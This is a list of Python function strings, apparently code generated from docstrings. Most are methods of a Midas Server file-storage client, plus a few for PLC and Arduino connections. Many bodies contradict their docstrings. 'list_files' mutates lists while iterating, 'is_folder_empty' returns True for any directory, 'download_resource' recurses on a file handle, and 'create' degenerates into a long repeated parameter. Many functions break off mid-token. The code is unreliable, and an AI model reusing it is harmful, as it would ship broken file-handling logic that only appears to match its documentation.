        "def list_files(self, folder=None):\n        \"\"\"\n        Lists the files and folders of a specific directory\n        default is the current working directory.\n\n        :param folder: the folder to be listed.\n        :type folder: string\n\n        :returns: a tuple with the list of files in the folder\n                  and the list of subfolders in the folder.\n        \"\"\"\n        if folder is None:\n            folder = os.getcwd()\n\n        files = []\n        subfolders = []\n\n        for root, dirs, files in os.walk(folder):\n            for f in files:\n                files.remove(f)\n\n            for d in dirs:\n                dirs.remove(d)\n\n            for f in files:\n                subfolders.append(os.path.join(root, f))\n\n        return files, subfolders",
        "def create_folder(self, folder):\n        \"\"\"Creates a folder in the server\n\n        :param folder: the folder to be created.\n        :type folder: string\n        \"\"\"\n        return self.api_call(\n            ENDPOINTS['folders']['new'],\n            dict(folder=folder)\n        )",
        "def delete_file(self, filename):\n        \"\"\"Delete a file from the server.\n\n        :param filename: the file to be deleted.\n        :type filename: string\n        \"\"\"\n        self._client.delete(self._url + filename)",
        "def delete_folder(self, foldername):\n        \"\"\"Delete a folder from the server.\n\n        :param foldername: the folder to be deleted.\n        :type foldername: string\n        \"\"\"\n        url = self._url + \"/folders/\" + foldername\n        return self._delete(url)",
        "def get_file_size(self, filename):\n        \"\"\"Returns the filesize of a file\n\n        :param filename: the full path to the file on the server.\n        :type filename: string\n\n        :returns: string representation of the filesize.\n        \"\"\"\n        response = self._get(self.base_url + filename)\n        return response.json()['size']",
        "def upload_file(self, filename, location):\n        \"\"\"Uploads a file on the server to the desired location\n\n        :param filename: the name of the file to be uploaded.\n        :type filename: string\n        :param location: the directory in which the file will\n                         be stored.\n        :type location: string\n        \"\"\"\n        self.log.debug(\"Uploading file %s to %s\", filename, location)\n        self.client.put_object(\n            Bucket=self.bucket, Key=filename, Body=open(filename, 'rb'))\n        self.log.debug(\"Uploaded file %s to %s\", filename, location)",
        "def _parse_block(self, block):\n        \"\"\"Parses a block of text indiscriminately\"\"\"\n        self._block_index += 1\n        self._block_length += len(block)\n        self._block_text += block\n        self._block_text_length += len(block)\n        if self._block_index >= self._block_length:\n            self._block_index = 0\n            self._block_length = 0\n            self._block_text = ''\n            self._block_text_length = 0",
        "def _parse_inline_links(self, line):\n        \"\"\"\n        Parses a block of text rendering links that occur on their own line\n        normally but rendering inline links using a special template dir\n        \"\"\"\n        # We need to parse the line to get the template dir\n        template_dir = self._get_template_dir(line)\n        if template_dir is None:\n            return\n\n        # We need to parse the line to get the template name\n        template_name = self._get_template_name(line)\n        if template_name is None:\n            return\n\n        # We need to parse the line to get the template path\n        template_path = self._get_template_path(line)\n        if template_path is None:\n            return\n\n        # We need to parse the line to get the template name\n        template_name = self._get",
        "def login(email=None, password=None, api_key=None, application=None,\n         url=None, verify_ssl_certificate=True):\n    \"\"\"Do the legwork of logging into the Midas Server instance, storing the API\n    key and token.\n\n    :param email: (optional) Email address to login with. If not set, the\n        console will be prompted.\n    :type email: None | string\n    :param password: (optional) User password to login with. If not set and no\n        'api_key' is set, the console will be prompted.\n    :type password: None | string\n    :param api_key: (optional) API key to login with. If not set, password\n        login with be used.\n    :type api_key: None | string\n    :param application: (optional) Application name to be",
        "def get_token():\n    \"\"\"Renew or get a token to use for transactions with the Midas Server\n    instance.\n\n    :returns: API token.\n    :rtype: string\n    \"\"\"\n    if not hasattr(get_token, 'called'):\n        get_token.called = True\n        token = get_token.token\n        if token:\n            return token\n        token = get_token.token = get_token.get_token()\n        return token\n    return get_token.token",
        "def create_item_from_file(local_file, parent_folder_id, reuse_existing=False):\n    \"\"\"Create an item from the local file in the Midas Server folder corresponding\n    to the parent folder id.\n\n    :param local_file: full path to a file on the local file system\n    :type local_file: string\n    :param parent_folder_id: id of parent folder on the Midas Server instance,\n        where the item will be added\n    :type parent_folder_id: int | long\n    :param reuse_existing: (optional) whether to accept an existing item of the\n        same name in the same location, or create a new one instead\n    :type reuse_existing: bool\n    \"\"\"\n    if reuse_existing:\n        return\n\n    # Create the item\n    item = Item(local_file, parent_folder",
        "def create_folder(local_folder, parent_folder_id, reuse_existing=False):\n    \"\"\"Create a folder from the local file in the midas folder corresponding to\n    the parent folder id.\n\n    :param local_folder: full path to a directory on the local file system\n    :type local_folder: string\n    :param parent_folder_id: id of parent folder on the Midas Server instance,\n        where the folder will be added\n    :type parent_folder_id: int | long\n    :param reuse_existing: (optional) whether to accept an existing folder of\n       the same name in the same location, or create a new one instead\n    :type reuse_existing: bool\n    \"\"\"\n    if reuse_existing:\n        return\n\n    try:\n        midas_client = get_midas_client()\n        midas_folder =",
        "def create_checksum(file_path):\n    \"\"\"Create and return a hex checksum using the MD5 sum of the passed in file.\n    This will stream the file, rather than load it all into memory.\n\n    :param file_path: full path to the file\n    :type file_path: string\n    :returns: a hex checksum\n    :rtype: string\n    \"\"\"\n    with open(file_path, 'rb') as f:\n        checksum = hashlib.md5(f.read()).hexdigest()\n    return checksum",
        "def create_bitstream(file_path, local_file, log_ind=None):\n    \"\"\"Create a bitstream in the given item.\n\n    :param file_path: full path to the local file\n    :type file_path: string\n    :param local_file: name of the local file\n    :type local_file: string\n    :param log_ind: (optional) any additional message to log upon creation of\n        the bitstream\n    :type log_ind: None | string\n    \"\"\"\n    log_ind = log_ind or 'Creating bitstream'\n    log.info(log_ind)\n    item = get_item(file_path)\n    if not item:\n        log.error('File %s does not exist', file_path)\n        return\n    try:\n        bitstream = item.create_bitstream(local_file)\n    except",
        "def upload_file(local_file, parent_folder_id, file_path, reuse_existing=False):\n    \"\"\"Function for doing an upload of a file as an item. This should be a\n    building block for user-level functions.\n\n    :param local_file: name of local file to upload\n    :type local_file: string\n    :param parent_folder_id: id of parent folder on the Midas Server instance,\n        where the item will be added\n    :type parent_folder_id: int | long\n    :param file_path: full path to the file\n    :type file_path: string\n    :param reuse_existing: (optional) whether to accept an existing item of the\n        same name in the same location, or create a new one instead\n    :type reuse_existing: bool\n    \"\"\"\n    # Create the item\n    item",
        "def create_remote_folder(local_folder, parent_folder_id):\n    \"\"\"Function for creating a remote folder and returning the id. This should be\n    a building block for user-level functions.\n\n    :param local_folder: full path to a local folder\n    :type local_folder: string\n    :param parent_folder_id: id of parent folder on the Midas Server instance,\n        where the new folder will be added\n    :type parent_folder_id: int | long\n    :returns: id of the remote folder that was created\n    :rtype: int | long\n    \"\"\"\n    # Create the folder\n    try:\n        response = _create_folder(local_folder, parent_folder_id)\n    except MidasError as e:\n        raise MidasError(e.code, e.message)\n\n    # Return",
        "def upload_folder(local_folder, parent_folder_id, leaf_folders_as_items=False,\n                 reuse_existing=False):\n    \"\"\"Function to recursively upload a folder and all of its descendants.\n\n    :param local_folder: full path to local folder to be uploaded\n    :type local_folder: string\n    :param parent_folder_id: id of parent folder on the Midas Server instance,\n        where the new folder will be added\n    :type parent_folder_id: int | long\n    :param leaf_folders_as_items: (optional) whether leaf folders should have\n        all files uploaded as single items\n    :type leaf_folders_as_items: bool\n    :param reuse_existing: (optional) whether to accept an existing item of the\n        same name in the same location, or create a new one instead\n    :type reuse",
        "def is_folder_empty(local_folder):\n    \"\"\"Return whether a folder contains only files. This will be False if the\n    folder contains any subdirectories.\n\n    :param local_folder: full path to the local folder\n    :type local_folder: string\n    :returns: True if the folder contains only files\n    :rtype: bool\n    \"\"\"\n    if os.path.isdir(local_folder):\n        return True\n    for root, dirs, files in os.walk(local_folder):\n        for filename in files:\n            if filename.endswith('.py'):\n                return True\n    return False",
        "def upload_folder(local_folder, parent_folder_id, reuse_existing=False):\n    \"\"\"\n    Upload a folder as a new item. Take a folder and use its base name as the\n    name of a new item. Then, upload its containing files into the new item as\n    bitstreams.\n\n    :param local_folder: The path to the folder to be uploaded\n    :type local_folder: string\n    :param parent_folder_id: The id of the destination folder for the new item.\n    :type parent_folder_id: int | long\n    :param reuse_existing: (optional) whether to accept an existing item of the\n        same name in the same location, or create a new one instead\n    :type reuse_existing: bool\n    \"\"\"\n    if reuse_existing:\n        return\n\n    # Create the new item\n    item = Item(",
        "def upload_file_pattern(file_pattern, destination='Private',\n                        leaf_folders_as_items=False, reuse_existing=False,\n                        **kwargs):\n    \"\"\"\n    Upload a pattern of files. This will recursively walk down every tree in\n    the file pattern to create a hierarchy on the server. As of right now, this\n    places the file into the currently logged in user's home directory.\n\n    :param file_pattern: a glob type pattern for files\n    :type file_pattern: string\n    :param destination: (optional) name of the midas destination folder,\n        defaults to Private\n    :type destination: string\n    :param leaf_folders_as_items: (optional) whether leaf folders should have\n        all files uploaded as single items\n    :type leaf_folders_as_items: bool\n    :param reuse_existing: (optional) whether to",
        "def _descend_path(parsed_path, folder_id):\n    \"\"\"Descend a path to return a folder id starting from the given folder id.\n\n    :param parsed_path: a list of folders from top to bottom of a hierarchy\n    :type parsed_path: list[string]\n    :param folder_id: The id of the folder from which to start the descent\n    :type folder_id: int | long\n    :returns: The id of the found folder or -1\n    :rtype: int | long\n    \"\"\"\n    if folder_id < 0:\n        raise ValueError(\"Invalid folder id: %s\" % folder_id)\n    if folder_id == 0:\n        return -1\n    if folder_id == len(parsed_path) - 1:\n        return 0\n    return _descend_path(parsed_path[folder_id + 1",
        "def find_resource(name, folder_id=None):\n    \"\"\"Find an item or folder matching the name. A folder will be found first if\n    both are present.\n\n    :param name: The name of the resource\n    :type name: string\n    :param folder_id: The folder to search within\n    :type folder_id: int | long\n    :returns: A tuple indicating whether the resource is an item an the id of\n        said resource. i.e. (True, item_id) or (False, folder_id). Note that in\n        the event that we do not find a result return (False, -1)\n    :rtype: (bool, int | long)\n    \"\"\"\n    if not name:\n        return False, -1\n\n    if folder_id is None:\n        folder_id = 0\n\n    for item in get",
        "def get_folder_id(path):\n    \"\"\"Get a folder id from a path on the server.\n\n    Warning: This is NOT efficient at all.\n\n    The schema for this path is:\n    path := \"/users/<name>/\" | \"/communities/<name>\" , {<subfolder>/}\n    name := <firstname> , \"_\" , <lastname>\n\n    :param path: The virtual path on the server.\n    :type path: string\n    :returns: a tuple indicating True or False about whether the resource is an\n        item and id of the resource i.e. (True, item_id) or (False, folder_id)\n    :rtype: (bool, int | long)\n    \"\"\"\n    if path.startswith(\"/\"):\n        path = path[1:]\n    if path.startswith(\"/\"):\n        path = path[",
        "def download_folder(folder_id, path=None):\n    \"\"\"Download a folder to the specified path along with any children.\n\n    :param folder_id: The id of the target folder\n    :type folder_id: int | long\n    :param path: (optional) the location to download the folder\n    :type path: string\n    \"\"\"\n    if path is None:\n        path = os.path.join(os.path.dirname(__file__), 'downloads')\n    if not os.path.exists(path):\n        os.makedirs(path)\n    folder = get_folder(folder_id)\n    for child in folder.get_children():\n        download_folder(child.id, path=os.path.join(path, child.name))",
        "def download_item(item_id, path=None, item=None):\n    \"\"\"Download the requested item to the specified path.\n\n    :param item_id: The id of the item to be downloaded\n    :type item_id: int | long\n    :param path: (optional) the location to download the item\n    :type path: string\n    :param item: The dict of item info\n    :type item: dict | None\n    \"\"\"\n    if item is None:\n        item = get_item(item_id)\n    if path is None:\n        path = get_item_path(item_id)\n    if os.path.exists(path):\n        return\n    if os.path.isdir(path):\n        raise ValueError('The path %s is a directory' % path)\n    os.makedirs(path)\n    download_",
        "def download_resource(server_path, local_path):\n    \"\"\"Recursively download a file or item from the Midas Server instance.\n\n    :param server_path: The location on the server to find the resource to\n        download\n    :type server_path: string\n    :param local_path: The location on the client to store the downloaded data\n    :type local_path: string\n    \"\"\"\n    if os.path.isdir(local_path):\n        return\n    if os.path.isfile(local_path):\n        return\n    try:\n        with open(local_path, 'wb') as f:\n            download_resource(server_path, f)\n    except IOError:\n        pass",
        "def login(self, email, api_key, application='Default'):\n        \"\"\"Login and get a token. If you do not specify a specific application,\n        'Default' will be used.\n\n        :param email: Email address of the user\n        :type email: string\n        :param api_key: API key assigned to the user\n        :type api_key: string\n        :param application: (optional) Application designated for this API key\n        :type application: string\n        :returns: Token to be used for interaction with the API until\n            expiration\n        :rtype: string\n        \"\"\"\n        self.login_email = email\n        self.login_api_key = api_key\n        self.login_application = application\n        return self.get_token()",
        "def get_folders(self, token):\n        \"\"\"List the folders in the users home area.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :returns: List of dictionaries containing folder information.\n        :rtype: list[dict]\n        \"\"\"\n        response = self._request(\n            'get',\n            'users/' + token + '/folders'\n        )\n        return response.json()",
        "def get_api_key(self, email, password):\n        \"\"\"Get the default API key for a user.\n\n        :param email: The email of the user.\n        :type email: string\n        :param password: The user's password.\n        :type password: string\n        :returns: API key to confirm that it was fetched successfully.\n        :rtype: string\n        \"\"\"\n        url = self.api_url + '/user/api_key'\n        params = {'email': email, 'password': password}\n        response = self.session.get(url, params=params)\n        response.raise_for_status()\n        return response.json()['api_key']",
        "def list_users(self, limit=None):\n        \"\"\"List the public users in the system.\n\n        :param limit: (optional) The number of users to fetch.\n        :type limit: int | long\n        :returns: The list of users.\n        :rtype: list[dict]\n        \"\"\"\n        return self._client.get(\n            self._url('/users'),\n            params={'limit': limit}\n        )",
        "def get_user_by_email(self, email):\n        \"\"\"Get a user by the email of that user.\n\n        :param email: The email of the desired user.\n        :type email: string\n        :returns: The user requested.\n        :rtype: dict\n        \"\"\"\n        return self.get_user(self.user_manager.get_user_by_email(email))",
        "def create_community(self, token, name, description=None,\n                         uuid=None, privacy='Public', can_join='Everyone'):\n        \"\"\"Create a new community or update an existing one using the uuid.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param name: The community name.\n        :type name: string\n        :param description: (optional) The community description.\n        :type description: string\n        :param uuid: (optional) uuid of the community. If none is passed, will\n            generate one.\n        :type uuid: string\n        :param privacy: (optional) Default 'Public', possible values\n            [Public|Private].\n        :type privacy: string\n        :param can_join: (optional) Default 'Everyone', possible values\n            [Everyone|Invitation].\n       ",
        "def get_community(self, name, token=None):\n        \"\"\"Get a community based on its name.\n\n        :param name: The name of the target community.\n        :type name: string\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: The requested community.\n        :rtype: dict\n        \"\"\"\n        community = self.get_community_by_name(name, token=token)\n        return community",
        "def get_community(self, community_id, token=None):\n        \"\"\"Get a community based on its id.\n\n        :param community_id: The id of the target community.\n        :type community_id: int | long\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: The requested community.\n        :rtype: dict\n        \"\"\"\n        return self._get(\n            '/community/{community_id}'.format(community_id=community_id),\n            token=token\n        )",
        "def get_community_children(self, community_id, token=None):\n        \"\"\"Get the non-recursive children of the passed in community_id.\n\n        :param community_id: The id of the requested community.\n        :type community_id: int | long\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: List of the folders in the community.\n        :rtype: dict[string, list]\n        \"\"\"\n        community = self.get_community(community_id, token=token)\n        return community.get_children()",
        "def list_communities(self, token=None):\n        \"\"\"List all communities visible to a user.\n\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: The list of communities.\n        :rtype: list[dict]\n        \"\"\"\n        url = self._build_url(self._endpoints.get('list_communities'))\n        if token:\n            url += '?token=' + token\n        response = self.con.get(url)\n        return response.json()",
        "def get_folder_attributes(self, token, folder_id):\n        \"\"\"Get the attributes of the specified folder.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param folder_id: The id of the requested folder.\n        :type folder_id: int | long\n        :returns: Dictionary of the folder attributes.\n        :rtype: dict\n        \"\"\"\n        return self._client.get(\n            self.folder_attributes_path % (token, folder_id),\n            headers=self.headers,\n        )",
        "def get_folder_children(self, token, folder_id):\n        \"\"\"Get the non-recursive children of the passed in folder_id.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param folder_id: The id of the requested folder.\n        :type folder_id: int | long\n        :returns: Dictionary of two lists: 'folders' and 'items'.\n        :rtype: dict[string, list]\n        \"\"\"\n        response = self._request(\n            'get',\n            '/v2/folder/children',\n            params={'token': token, 'id': folder_id}\n        )\n        return response.json()",
        "def delete_folder(self, token, folder_id):\n        \"\"\"Delete the folder with the passed in folder_id.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param folder_id: The id of the folder to be deleted.\n        :type folder_id: int | long\n        :returns: None.\n        :rtype: None\n        \"\"\"\n        url = self._build_url(self._endpoints.get('folders').format(token=token, id=folder_id))\n        return self.generic_request(url, method='DELETE')",
        "def move_folder(self, token, folder_id, dest_folder_id):\n        \"\"\"Move a folder to the destination folder.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param folder_id: The id of the folder to be moved.\n        :type folder_id: int | long\n        :param dest_folder_id: The id of destination (new parent) folder.\n        :type dest_folder_id: int | long\n        :returns: Dictionary containing the details of the moved folder.\n        :rtype: dict\n        \"\"\"\n        params = {\n            'token': token,\n            'folder_id': folder_id,\n            'dest_folder_id': dest_folder_id\n        }\n        return self._post('move_folder', params)",
        "def create_item(self, token, name, parent_id, description=None,\n                    uuid=None, privacy=None):\n        \"\"\"Create an item to the server.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param name: The name of the item to be created.\n        :type name: string\n        :param parent_id: The id of the destination folder.\n        :type parent_id: int | long\n        :param description: (optional) The description text of the item.\n        :type description: string\n        :param uuid: (optional) The UUID for the item. It will be generated if\n            not given.\n        :type uuid: string\n        :param privacy: (optional) The privacy state of the item\n            ('Public' or 'Private').\n        :type privacy: string\n       ",
        "def get_item_attributes(self, token, item_id):\n        \"\"\"Get the attributes of the specified item.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of the requested item.\n        :type item_id: int | string\n        :returns: Dictionary of the item attributes.\n        :rtype: dict\n        \"\"\"\n        return self._get(self.item_attributes_path % (token, item_id))",
        "def download(self, item_id, token=None, revision=None):\n        \"\"\"Download an item to disk.\n\n        :param item_id: The id of the item to be downloaded.\n        :type item_id: int | long\n        :param token: (optional) The authentication token of the user\n            requesting the download.\n        :type token: None | string\n        :param revision: (optional) The revision of the item to download, this\n            defaults to HEAD.\n        :type revision: None | int | long\n        :returns: A tuple of the filename and the content iterator.\n        :rtype: (string, unknown)\n        \"\"\"\n        return self._client.download(item_id, token, revision)",
        "def delete_item(self, token, item_id):\n        \"\"\"Delete the item with the passed in item_id.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of the item to be deleted.\n        :type item_id: int | long\n        :returns: None.\n        :rtype: None\n        \"\"\"\n        self.set_token(token)\n        self.set_item_id(item_id)\n        self.request_handler.delete(self.url)",
        "def get_item_metadata(self, item_id, token=None, revision=None):\n        \"\"\"Get the metadata associated with an item.\n\n        :param item_id: The id of the item for which metadata will be returned\n        :type item_id: int | long\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :param revision: (optional) Revision of the item. Defaults to latest\n            revision.\n        :type revision: int | long\n        :returns: List of dictionaries containing item metadata.\n        :rtype: list[dict]\n        \"\"\"\n        return self.get_item(item_id, token=token, revision=revision)",
        "def set_metadata(self, token, item_id, element, value, qualifier=None):\n        \"\"\"Set the metadata associated with an item.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of the item for which metadata will be set.\n        :type item_id: int | long\n        :param element: The metadata element name.\n        :type element: string\n        :param value: The metadata value for the field.\n        :type value: string\n        :param qualifier: (optional) The metadata qualifier. Defaults to empty\n            string.\n        :type qualifier: None | string\n        :returns: None.\n        :rtype: None\n        \"\"\"\n        data = {'token': token,\n                'item_id': item_id,\n                'element': element,\n",
        "def share_item(self, token, item_id, dest_folder_id):\n        \"\"\"Share an item to the destination folder.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of the item to be shared.\n        :type item_id: int | long\n        :param dest_folder_id: The id of destination folder where the item is\n            shared to.\n        :type dest_folder_id: int | long\n        :returns: Dictionary containing the details of the shared item.\n        :rtype: dict\n        \"\"\"\n        params = {'token': token, 'item_id': item_id, 'dest_folder_id': dest_folder_id}\n        return self._get('/share_item', params)",
        "def move_item(self, token, item_id, src_folder_id, dest_folder_id):\n        \"\"\"Move an item from the source folder to the destination folder.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of the item to be moved\n        :type item_id: int | long\n        :param src_folder_id: The id of source folder where the item is located\n        :type src_folder_id: int | long\n        :param dest_folder_id: The id of destination folder where the item is\n            moved to\n        :type dest_folder_id: int | long\n        :returns: Dictionary containing the details of the moved item\n        :rtype: dict\n        \"\"\"\n        params = {'token': token, 'item_id': item_",
        "def get_items(self, name, token=None):\n        \"\"\"Return all items.\n\n        :param name: The name of the item to search by.\n        :type name: string\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: A list of all items with the given name.\n        :rtype: list[dict]\n        \"\"\"\n        return self.get_items_by_name(name, token=token)",
        "def get_items(self, name, folder_id, token=None):\n        \"\"\"Return all items with a given name and parent folder id.\n\n        :param name: The name of the item to search by.\n        :type name: string\n        :param folder_id: The id of the parent folder to search by.\n        :type folder_id: int | long\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: A list of all items with the given name and parent folder id.\n        :rtype: list[dict]\n        \"\"\"\n        return self.client.get_items(name, folder_id, token=token)",
        "def get_items(self, name, folder_name, token=None):\n        \"\"\"Return all items with a given name and parent folder name.\n\n        :param name: The name of the item to search by.\n        :type name: string\n        :param folder_name: The name of the parent folder to search by.\n        :type folder_name: string\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :returns: A list of all items with the given name and parent folder\n            name.\n        :rtype: list[dict]\n        \"\"\"\n        return self.client.get_items(name, folder_name, token=token)",
        "def create_link_bitstream(self, token, folder_id, url, item_name=None,\n                              length=None, checksum=None):\n        \"\"\"Create a link bitstream.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param folder_id: The id of the folder in which to create a new item\n            that will contain the link. The new item will have the same name as\n            the URL unless an item name is supplied.\n        :type folder_id: int | long\n        :param url: The URL of the link you will create, will be used as the\n            name of the bitstream and of the item unless an item name is\n            supplied.\n        :type url: string\n        :param item_name: (optional)  The name of the newly created item, if\n            not supplied, the item",
        "def generate_upload_token(self, token, item_id, filename, checksum=None):\n        \"\"\"Generate a token to use for upload.\n\n        Midas Server uses a individual token for each upload. The token\n        corresponds to the file specified and that file only. Passing the MD5\n        checksum allows the server to determine if the file is already in the\n        asset store.\n\n        If :param:`checksum` is passed and the token returned is blank, the\n        server already has this file and there is no need to follow this\n        call with a call to `perform_upload`, as the passed in file will have\n        been added as a bitstream to the item's latest revision, creating a\n        new revision if one doesn't exist.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The id of",
        "def upload_file(self, upload_token, filename, mode='stream',\n                    folder_id=None, item_id=None, revision=None,\n                    filepath=None, create_additional_revision=False):\n        \"\"\"Upload a file into a given item (or just to the public folder if the\n        item is not specified.\n\n        :param upload_token: The upload token (returned by\n            generate_upload_token)\n        :type upload_token: string\n        :param filename: The upload filename. Also used as the path to the\n            file, if 'filepath' is not set.\n        :type filename: string\n        :param mode: (optional) Stream or multipart. Default is stream.\n        :type mode: string\n        :param folder_id: (optional) The id of the folder to upload into.\n        :type folder_id: int |",
        "def search(self, search, token=None):\n        \"\"\"Get the resources corresponding to a given query.\n\n        :param search: The search criterion.\n        :type search: string\n        :param token: (optional) The credentials to use when searching.\n        :type token: None | string\n        :returns: Dictionary containing the search result. Notable is the\n            dictionary item 'results', which is a list of item details.\n        :rtype: dict\n        \"\"\"\n        params = {'q': search}\n        if token:\n            params['token'] = token\n        return self._get(self.base + '/search', params=params)",
        "def add_condor_dag(self, token, batchmaketaskid, dagfilename, dagmanoutfilename):\n        \"\"\"Add a Condor DAG to the given Batchmake task.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param batchmaketaskid: id of the Batchmake task for this DAG\n        :type batchmaketaskid: int | long\n        :param dagfilename: Filename of the DAG file\n        :type dagfilename: string\n        :param dagmanoutfilename: Filename of the DAG processing output\n        :type dagmanoutfilename: string\n        :returns: The created Condor DAG DAO\n        :rtype: dict\n        \"\"\"\n        data = {\n            'token': token,\n            'batchmaketaskid': batchmaket",
        "def add_job(self, token, batchmaketaskid, jobdefinitionfilename,\n                 outputfilename, errorfilename, logfilename, postfilename):\n        \"\"\"\n        Add a Condor DAG job to the Condor DAG associated with this\n        Batchmake task\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param batchmaketaskid: id of the Batchmake task for this DAG\n        :type batchmaketaskid: int | long\n        :param jobdefinitionfilename: Filename of the definition file for the\n            job\n        :type jobdefinitionfilename: string\n        :param outputfilename: Filename of the output file for the job\n        :type outputfilename: string\n        :param errorfilename: Filename of the error file for the job\n        :type errorfilename: string\n        :param log",
        "def extract_dicom_metadata(self, token, item_id):\n        \"\"\"Extract DICOM metadata from the given item\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: id of the item to be extracted\n        :type item_id: int | long\n        :return: the item revision DAO\n        :rtype: dict\n        \"\"\"\n        return self._get_item(item_id, token, 'dicom_metadata')",
        "def login(self, temp_token, one_time_pass):\n        \"\"\"Log in to get the real token using the temporary token and otp.\n\n        :param temp_token: The temporary token or id returned from normal login\n        :type temp_token: string\n        :param one_time_pass: The one-time pass to be sent to the underlying\n            multi-factor engine.\n        :type one_time_pass: string\n        :returns: A standard token for interacting with the web api.\n        :rtype: string\n        \"\"\"\n        self.log_in(temp_token, one_time_pass)\n        return self.get_token()",
        "def create_thumbnail(self, token, bitstream_id, item_id, width=575):\n        \"\"\"Create a big thumbnail for the given bitstream with the given width.\n        It is used as the main image of the given item and shown in the item\n        view page.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param bitstream_id: The bitstream from which to create the thumbnail.\n        :type bitstream_id: int | long\n        :param item_id: The item on which to set the thumbnail.\n        :type item_id: int | long\n        :param width: (optional) The width in pixels to which to resize (aspect\n            ratio will be preserved). Defaults to 575.\n        :type width: int | long\n        :returns: The ItemthumbnailDao object that was created.\n        :r",
        "def create_thumbnail(self, token, item_id):\n        \"\"\"\n        Create a 100x100 small thumbnail for the given item. It is used for\n        preview purpose and displayed in the 'preview' and 'thumbnails'\n        sidebar sections.\n\n        :param token: A valid token for the user in question.\n        :type token: string\n        :param item_id: The item on which to set the thumbnail.\n        :type item_id: int | long\n        :returns: The item object (with the new thumbnail id) and the path\n            where the newly created thumbnail is stored.\n        :rtype: dict\n        \"\"\"\n        item = self.get_item(token, item_id)\n        thumbnail_path = self.create_thumbnail_path(item)\n        return item, thumbnail_path",
        "def search(self, query, token=None, limit=None):\n        \"\"\"Search item metadata using Apache Solr.\n\n        :param query: The Apache Lucene search query.\n        :type query: string\n        :param token: (optional) A valid token for the user in question.\n        :type token: None | string\n        :param limit: (optional) The limit of the search.\n        :type limit: int | long\n        :returns: The list of items that match the search query.\n        :rtype: list[dict]\n        \"\"\"\n        params = {'q': query}\n        if token:\n            params['token'] = token\n        if limit:\n            params['limit'] = limit\n        return self._search(params)",
        "def create(self,\n               token,\n               community_id,\n               producer_display_name,\n               producer_id,\n               value,\n               test_value,\n               test_value_type,\n               test_value_id,\n               test_value_type_id,\n               test_value_id_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_value_hash,\n               test_",
        "def upload_scalar_json(self,\n                           token,\n                           filepath,\n                           community_id,\n                           producer_display_name,\n                           producer_revision,\n                           submit_time,\n                           config_item_id=None,\n                           test_dataset_id=None,\n                           truth_dataset_id=None,\n                           parent_keys=None,\n                           silent=False,\n                           unofficial=False,\n                           build_results_url=None,\n                           branch=None,\n                           params=None,\n                           extra_urls=None,\n                           ):\n        \"\"\"Upload a JSON file containing numeric scoring results to be added as\n        scalars. File is parsed and then deleted from the server.\n\n        :param token: A valid token for the user in question.\n        :param filepath: The path to the JSON file.\n        :param community_id: The id of",
        "def get_version(self, key):\n        \"\"\"Obtain particular version of the doc at key.\"\"\"\n        if key not in self.versions:\n            raise KeyError(\"No such version: %s\" % key)\n        return self.versions[key]",
        "def _hash_invocation_methods(invocation_methods):\n    \"\"\"Find a hash value for the linear combination of invocation methods.\"\"\"\n    if not invocation_methods:\n        return 0\n    return hash(tuple(invocation_methods)) % len(invocation_methods)",
        "def connect(self, address, rack, slot, port):\n        \"\"\"Connects to a Siemens S7 PLC.\n\n        Connects to a Siemens S7 using the Snap7 library.\n        See [the snap7 documentation](http://snap7.sourceforge.net/) for\n        supported models and more details.\n\n        It's not currently possible to query the device for available pins,\n        so `available_pins()` returns an empty list. Instead, you should use\n        `map_pin()` to map to a Merker, Input or Output in the PLC. The\n        internal id you should use is a string following this format:\n        '[DMQI][XBWD][0-9]+.?[0-9]*' where:\n\n        * [DMQI]: D for DB, M for Merker, Q for Output, I for Input\n",
        "def connect(self, port):\n        \"\"\"\n        Connects to an Arduino UNO on serial port `port`.\n\n        @throw RuntimeError can't connect to Arduino\n        \"\"\"\n        if self.is_connected:\n            raise RuntimeError(\"Arduino is already connected\")\n        self.port = port\n        self.serial = serial.Serial(port, baudrate=self.baudrate)\n        self.serial.write(self.command)\n        self.serial.flush()",
        "def get_node_average_fitness(self):\n        \"\"\"\n        Returns a map of nodename to average fitness value for this block.\n        Assumes that required resources have been checked on all nodes.\n        \"\"\"\n        node_average_fitness = {}\n        for node in self.nodes:\n            node_average_fitness[node.name] = node.get_average_fitness()\n        return node_average_fitness",
        "def get_drivers():\n    \"\"\"Returns a list of available drivers names.\"\"\"\n    drivers = []\n    for driver in os.listdir(os.path.join(os.path.dirname(__file__), 'drivers')):\n        if driver.endswith('.py'):\n            drivers.append(driver[:-3])\n    return drivers",
